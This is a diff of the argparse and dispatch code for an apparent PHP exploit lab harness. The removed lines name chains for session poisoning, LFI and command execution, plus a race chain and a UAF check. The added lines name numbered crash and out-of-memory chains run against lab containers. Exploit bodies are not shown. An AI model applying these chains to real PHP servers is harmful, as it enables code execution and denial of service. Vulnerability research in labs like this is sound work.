-    verbose = ap.add_mutually_exclusive_group()
-    verbose.add_argument("-v", "--verbose", action="store_true", help="debug logging")
-    verbose.add_argument("-q", "--quiet", action="store_true", help="errors only")
-    ap.add_argument(
-        "--port",
-        type=int,
-        default=None,
-        help=f"host HTTP port (default: PHP2SHELL_HTTP_PORT, lab/.http-port, {DEFAULT_PORT})",
     )
     sub = ap.add_subparsers(dest="action", required=True)
 
-    p = sub.add_parser("up", help="render lab/ and start containers (waits for health)")
-    p.add_argument("--regen", action="store_true", help="overwrite existing lab/ files")
-    sub.add_parser("gen", help="render lab/ without starting containers").add_argument(
-        "--regen", action="store_true", help="overwrite existing lab/ files"
-    )
-    sub.add_parser("down", help="stop containers and remove volumes")
+    p = sub.add_parser("up", help="build and start the labs")
+    p.add_argument("--only", choices=["109619", "109618"], default=None)
 
-    p = sub.add_parser("rce", help="chain 1: session poison -> LFI include -> command exec")
-    p.add_argument("--cmd", default="id", help="command to run inside the php container")
-    p.add_argument("--sid", default="poc26rce0000000000000000")
+    sub.add_parser("gen", help="render lab/ without starting anything (CI)")
 
-    p = sub.add_parser("race", help="chain 1b: poison + include while the upload is in flight")
-    p.add_argument("--cmd", default="id", help="command to run inside the php container")
-    p.add_argument("--sid", default="poc26race000000000000000")
-    p.add_argument(
-        "--size", type=int, default=4 * 1024 * 1024, help="upload body bytes (64KiB..7MiB)"
-    )
-    p.add_argument("--timeout", type=float, default=60, help="seconds to keep probing")
-    p.add_argument(
-        "--stock-cleanup",
-        action="store_true",
-        help="temporarily set session.upload_progress.cleanup=On (stock default) and restore after",
-    )
+    sub.add_parser("down", help="stop and remove the labs")
 
-    p = sub.add_parser("mismatch", help="chain 2: handler mismatch -> object instantiation")
-    p.add_argument(
-        "--class",
-        dest="klass",
-        default="Gadget",
-        help="class to instantiate (must exist in api/endpoint.php)",
-    )
-    p.add_argument("--sid", default="poc26mm00000000000000000")
+    p = sub.add_parser("109619", help="run the stale-global-state chain")
+    p.add_argument("--php", choices=VERSIONS, default="8.5.11")
+    p.add_argument("--control", action="store_true", help="small filename: no OOM, expect no crash")
+    p.add_argument("--timeout", type=int, default=30)
 
-    sub.add_parser("uaf", help="behavioral unserialize UAF check on the lab's PHP")
-    return ap
+    p = sub.add_parser("109618", help="run the request-startup OOM chain")
+    p.add_argument("--php", choices=VERSIONS, default="8.5.11")
+    p.add_argument("--vector", choices=["headers", "nested", "chunked"], default="headers")
+    p.add_argument("--repeat", type=int, default=1)
+    p.add_argument("--timeout", type=int, default=120)
 
+    p = sub.add_parser("verify", help="run the positive/negative matrix")
+    p.add_argument("--all", action="store_true", help="include the 109618 lab")
 
-def main(argv: list[str] | None = None) -> int:
-    args = build_parser().parse_args(argv)
-    logging.basicConfig(
-        level=logging.DEBUG if args.verbose else logging.WARNING if args.quiet else logging.INFO,
-        format="%(message)s",
-    )
-    port: int = DEFAULT_PORT
-    try:
-        port = resolve_port(args.port)
-        if args.action == "gen":
-            generate_lab(port, regen=args.regen)
-            print(f"[+] lab rendered for http://{HOST}:{port} (project {project_name()})")
-            return 0
-        if args.action == "up":
-            lab_up(port, regen=args.regen)
-            return 0
-        if args.action == "down":
-            lab_down()
-            return 0
-        require_running()
-        if args.action == "rce":
-            return chain_rce(args.cmd, validate_sid(args.sid), port)
-        if args.action == "race":
-            return chain_race(
-                args.cmd,
-                validate_sid(args.sid),
-                port,
-                args.size,
-                args.timeout,
-                args.stock_cleanup,
-            )
-        if args.action == "mismatch":
-            return chain_mismatch(validate_class(args.klass), validate_sid(args.sid), port)
-        if args.action == "uaf":
-            return check_uaf()
-    except LabError as exc:
-        log.error("[-] %s", exc)
-        return 1
-    except OSError as exc:
-        log.error("[-] cannot reach the lab on %s:%d (%s); check 'up' and --port", HOST, port, exc)
-        return 1
-    return 1
+    args = ap.parse_args()
+    if args.action == "up":
+        up(args.only)
+        return 0
+    if args.action == "gen":
+        render()
+        print("lab rendered:", ", ".join(sorted(p.name for p in LAB.iterdir())))
+        return 0
+    if args.action == "down":
+        down()
+        return 0
+    if args.action == "109619":
+        return chain_109619(args.php, args.control, args.timeout)
+    if args.action == "109618":
+        return chain_109618(args.php, args.vector, args.repeat, args.timeout)
+    if args.action == "verify":
+        return verify(args.all)
+    return 2
 
 
 if __name__ == "__main__":
